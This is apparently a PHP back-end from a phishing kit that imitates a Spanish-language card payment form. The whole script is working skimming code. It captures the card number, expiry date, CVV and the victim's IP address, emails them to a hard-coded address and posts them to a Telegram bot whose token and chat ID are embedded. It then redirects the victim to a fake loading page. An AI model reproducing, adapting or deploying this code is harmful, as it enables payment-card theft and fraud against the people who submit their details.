<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['Sis_Numero_Tarjeta']) and !empty($_POST['Sis_Caducidad_Tarjeta_Mes']) and !empty($_POST['Sis_Caducidad_Tarjeta_Anno']) and !empty($_POST['Sis_Tarjeta_CVV2']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['cc']=$_POST['Sis_Numero_Tarjeta'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            $message = "😪M4X1M1L1AN0😪 CC (1) :" . $_POST['Sis_Numero_Tarjeta'] . "\nEXP :" . $_POST['Sis_Caducidad_Tarjeta_Mes'] ."/". $_POST['Sis_Caducidad_Tarjeta_Anno'] ."\nCVV :" . $_POST['Sis_Tarjeta_CVV2'] . "\n" . $ip . "\n*****************************\n";
			$to = "mrh4x3r@yandex.com";
			$subject = "[AU] | CC FROM 😪 : $ip";
			$headers = "From:Info <web>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
			function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1924813003:AAErDEouiMWvJxpGchlGPRAHR1ENkVSw3Sc';
    $chat_id  = '1896536987';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send(urlencode($message));
			
			
			
        header("Location: Seleccione_medio_de_codigo_loading.php?codigo_id=".md5($_GET['error']));
    }
}
?>